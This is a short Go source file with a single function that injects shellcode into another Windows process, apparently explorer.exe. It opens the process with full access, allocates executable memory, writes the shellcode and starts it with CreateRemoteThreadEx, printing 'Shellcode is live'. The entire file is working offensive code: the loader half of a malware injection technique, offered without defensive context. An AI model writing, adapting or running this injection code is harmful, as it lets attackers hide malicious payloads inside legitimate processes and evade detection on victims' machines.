package main

import (
	"fmt"

	winsyscall "github.com/nodauf/go-windows"
	"golang.org/x/sys/windows"
)

func remoteThread(shellcode []byte, pid int) {
	pid1 := uint32(1112)
	fmt.Println(pid1)
	fmt.Println(pid)
	pHandle, err := windows.OpenProcess(winsyscall.PROCESS_ALL_ACCESS, false, uint32(pid))
	if err != nil {
		panic(err)
	}
	defer windows.CloseHandle(pHandle)
	fmt.Println("Handle acquired to explorer.exe")

	var rPtr uintptr
	rPtr, err = winsyscall.VirtualAllocEx(pHandle, 0, uintptr(len(shellcode)), windows.MEM_COMMIT|windows.MEM_RESERVE, windows.PAGE_EXECUTE_READWRITE)
	if err != nil {
		panic(err)
	}
	fmt.Println("Allocated memory in remote process")

	var bytesWritten uintptr
	err = windows.WriteProcessMemory(pHandle, rPtr, &shellcode[0], uintptr(len(shellcode)), &bytesWritten)
	if err != nil {
		panic(err)
	}
	fmt.Println("Shellcode written to remote process")

	tHandle, err := winsyscall.CreateRemoteThreadEx(pHandle, nil, 0, rPtr, 0, 0, nil)
	defer windows.CloseHandle(tHandle)
	fmt.Println("Shellcode is live")
}
